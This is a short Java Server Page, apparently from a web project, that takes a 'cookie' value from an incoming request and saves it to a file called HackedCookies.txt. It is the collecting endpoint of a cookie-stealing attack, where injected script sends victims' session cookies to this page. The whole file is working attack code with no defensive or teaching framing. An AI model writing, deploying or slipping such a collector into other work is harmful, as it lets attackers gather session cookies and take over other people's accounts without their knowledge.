<%@page import="java.io.FileWriter"%>
<%@page import="java.io.BufferedWriter"%>
<%@page import="java.io.File"%>
<%@page import="java.io.Writer"%>
<%@page import="com.apps.Logcreation.Log"%>
<%@page import="com.apps.Database.DatabaseFile"%>
<%@page import="java.sql.*" %>
<%@page  session="true" %>
<%
try
{
    Log objLog  = objLog = new Log();
    
    //getting value from 
    String cookie = request.getParameter("cookie");
    
    //jdbc coding
    try
    {      
        Writer output = null;
        
        try
        {    
          File file = new File("D:/HackedCookies.txt");
          
           if (file.createNewFile())
           {
	        System.out.println("File is created!");	      
           }
           else
           {
	        System.out.println("File already exists.");
	   }
	    
          output = new BufferedWriter(new FileWriter(file));
          output.write("Cookie:" + cookie);
          output.write("\n");               
          output.close();          
        }
        catch(Exception e)
        {
            out.println(e);
        }                 
    }
    catch(Exception e)
    {
          e.printStackTrace();             
	  Log.logger.error("Error:", e);                				
    }
}
catch(Exception e)
{
    e.printStackTrace();
}
%>
